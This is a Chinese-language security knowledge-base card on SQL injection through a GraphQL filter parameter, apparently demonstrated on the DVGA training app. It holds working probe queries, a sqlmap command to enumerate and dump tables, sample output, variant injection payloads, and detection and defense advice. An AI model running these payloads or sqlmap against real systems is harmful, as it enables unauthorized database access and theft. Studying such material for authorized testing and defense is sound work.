---
id: web-generic-sqli-graphql-filter-parameter-injection
title: GraphQL filter 参数直接拼进 SQL WHERE：单引号报错回显完整语句，sqlmap 用 JSON body 跑出全部表
type: scenario
domain: web
path: web/generic/sqli
technique: graphql-filter-parameter-sql-injection
tags:
- graphql
- sql-injection
- sqli
- error-based
- sqlmap
- dvga
- api
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V544
  verified_at: '2026-11-11T20:38:56+08:00'
  notes: '已逐张核对33张图（全部超1200px，读img_small，无失败）与content.md：img28 pastes(public:true)正常查询、img29 filter值加单引号报sqlite3.OperationalError并回显完整SQL（实际8列：id/title/content/public/user_agent/ip_addr/owner_id/burn）、img30 Yakit对JSON body加注入标记、img31 sqlmap -r 1.txt --batch --dbms=sqlite --tables 输出JSON #1* Custom POST/UNION/SQLite/表audits-owners-pastes-servemode-users，均与卡片一致。验证时修正2处：①一句话结论的探错payload由泛化filter:"''"改为原文截图值This is my first paste''；②UNION对齐列数由“pastes查询三列(title/content/public)”更正为底层SQL 8列（GraphQL只请求3字段，sqlmap载荷为8列21/CHAR(...)）。dedup：候选web-generic-sqli-json-fieldconditions-value-updatexml-union等为不同接口/技术栈，保持独立；dup-scan无本卡pair。DVGA靶场无组件版本标记，affected_versions不设。'
url: /docs/web/generic/sqli/web-generic-sqli-graphql-filter-parameter-injection/
draft: false
kb_aliases:
- GraphQL SQL 注入
- filter 参数注入
- GraphQL 注入
- DVGA SQL 注入
- sqlmap 跑 GraphQL
- JSON body 注入点
---

## 一句话结论

GraphQL 的 `filter` 参数只负责把字符串传进 resolver，resolver 若把该值直接拼进 SQL 的 `WHERE title = '...' or content = '...'`，就会像普通 Web 参数一样存在 SQL 注入：发送 `pastes(filter:"This is my first paste'")`（在 filter 值末尾加单引号）即触发 `sqlite3.OperationalError near "'This'"` 并把完整 SQL 语句、参数与后端类型（SQLite）回显在 GraphQL `errors` 里，之后用 sqlmap 对 `{"query":"...pastes(filter:\"*\")..."}` 的 JSON body 跑注入即可列出 `audits/owners/pastes/servemode/users` 等表。

## 原理

- **GraphQL 只是传输层**：哪些字段、哪些参数能到达数据库由 resolver 决定，GraphQL 的类型系统（`filter: String`）不提供任何注入防护。参数值进入后端后与普通 HTTP 参数等价。
- **字符串拼接**：靶场把 `filter` 直接嵌到 SQL 模板里，生成 `... AND title = '<filter>' or content = '<filter>' ORDER BY ...`。单引号闭合字符串后即可改变语法，`'` 使 SQL 变成不完整字符串，数据库报 `near "'This'": syntax error`。
- **报错回显放大危害**：SQLAlchemy 的异常信息把 `[SQL: SELECT pastes.id AS ...]` 与 `[parameters: (1000, 0)]` 一并放进 GraphQL 响应 `errors[].message`，攻击者无需盲注即可拿到表名、列名、拼接位置和数据库类型（这里是 SQLite）。
- **sqlmap 可利用性**：注入点是 POST JSON body 内的 GraphQL 文档字符串，用 `*` 标记（如 Yakit 加注入标记后保存请求文件），`sqlmap -r` 可识别 JSON 参数并自动构造 UNION 注入。UNION 需要与底层 `pastes` SQL 的列数（示例为 8 列：id/title/content/public/user_agent/ip_addr/owner_id/burn，而非 GraphQL 仅请求的 3 个字段）对齐，sqlmap 自动用 `CHAR(...)` 拼接。
- **GraphQL 特有风险**：很多团队把 GraphQL 视为"新接口"而只做 schema 权限/复杂度控制，resolver 内的数据访问仍沿用不安全的字符串拼接；且单端点让 WAF 与日志更难按 URL 规则识别注入。

## 触发条件

- GraphQL schema 暴露带过滤参数（如 `pastes(filter: String)`、`search(keyword: String)`）的查询或 mutation。
- resolver/ORM 把用户输入以字符串拼接方式写入 SQL（`text()`、f-string、字符串加号），未使用参数化绑定。
- 后端开启详细错误返回（GraphQL `errors` 未统一化），或攻击者可用布尔/时间盲注判断。
- 仅用于授权测试；对生产库避免写操作与高负载 payload。

## 利用步骤

1. 通过 introspection/字段建议找到带字符串参数的查询，例如 `pastes(public:true){title content public}`。
2. 正常请求确认功能：`query { pastes(filter:"This is my first paste"){ title content public } }`。
3. 单引号探错：把 filter 改成 `This is my first paste'`，观察响应是否出现数据库错误与完整 SQL 语句；确认拼接位置（`title = '...' or content = '...'`）与列数。
4. 用 Yakit/Burp 给 JSON body 的注入点加标记（如 `filter:"*"`），保存为请求文件。
5. `sqlmap -r 1.txt --batch --dbms=sqlite --tables` 自动识别 UNION 注入并列出表；再按需 `--dump` 目标表（用户、审计、会话等）。
6. 若 UNION 列数不匹配，按报错/查询字段数量调整；若错误被关闭，改用布尔或时间盲注。

## PoC

```graphql
# 正常请求
query {
  pastes(filter: "This is my first paste") {
    title
    content
    public
  }
}

# 单引号探错（引发 SQL 语法错误并回显语句）
query {
  pastes(filter: "This is my first paste'") {
    title
    content
    public
  }
}
```

```text
# 响应 errors[].message 片段（回显完整 SQL 与参数）
(sqlite3.OperationalError) near "'This'": syntax error
[SQL: SELECT pastes.id AS pastes_id, pastes.title AS pastes_title, ...,
       pastes.burn AS pastes_burn
FROM pastes
WHERE pastes.public = 0 AND pastes.burn = 0
  AND title = 'This is my first paste' or content = 'This is my first paste'
ORDER BY pastes.id DESC LIMIT ? OFFSET ?]
[parameters: (1000, 0)]
```

```bash
# 请求文件内 JSON body（graphql 文档中的 * 为 sqlmap 注入标记）
# {"operationName":null,"variables":{},"query":"{\n  pastes(filter: \"*\") {\n    title\n    content\n    public\n  }\n}"}
sqlmap -r 1.txt --batch --dbms=sqlite --tables
```

```text
# sqlmap 输出（节选）
Parameter: JSON #1* (Custom POST)
    Type: UNION query
back-end DBMS: SQLite
Database: SQLite_masterdb
[5 tables]
+------------+
| audits     |
| owners     |
| pastes     |
| servemode  |
| users      |
+------------+
```

## 变体与关联

- 变体：注入点可能是 search、order、分页参数、嵌套对象字段（`where:{title:{contains:"..."}}`），本质都是 resolver 拼 SQL。
- 变体：MySQL/PostgreSQL 时可用 `' OR 1=1-- -`、UNION、堆叠（视驱动）、报错注入函数；SQLite 常用 UNION 对齐列数。
- 变体：错误被统一化时，用布尔条件（`' AND 1=1-- -` 与 `' AND 1=2-- -`）比较结果，或用时间函数做盲注。
- 关联：[[web-generic-graphql-endpoint-discovery-schema-enumeration]]（找到带 filter 的查询）、[[web-generic-graphql-importpaste-command-injection]]（同靶场另一类 resolver 注入）、[[web-generic-sqli-llamaindex-duckdb-refdocid-copy-file-rce]]（同为 GraphQL/框架层参数下沉到 SQL 引擎）。

## 检测与防御

- 检测：审计 resolver 中 `text()/execute()` 等调用与字符串拼接；监控 GraphQL 请求里 `filter`/`search` 等参数包含单引号、UNION、注释符、`CHAR(`；关注响应 `errors` 中泄露 SQL 语句的行为并告警。
- 防御：所有 SQL 使用参数化绑定/ORM 条件构造器（SQLAlchemy `filter()` 传参而非 `text()` 拼接）；GraphQL 入参做类型与长度校验；生产环境统一错误信息，禁止把 SQLAlchemy 异常原文返回给客户端；对数据库账号最小权限；WAF 对 GraphQL JSON body 做语义解析而非只匹配 URL。
- 说明：本文是 GraphQL 参数下沉 SQL 的注入场景，severity 记为 high；仅用于授权测试。
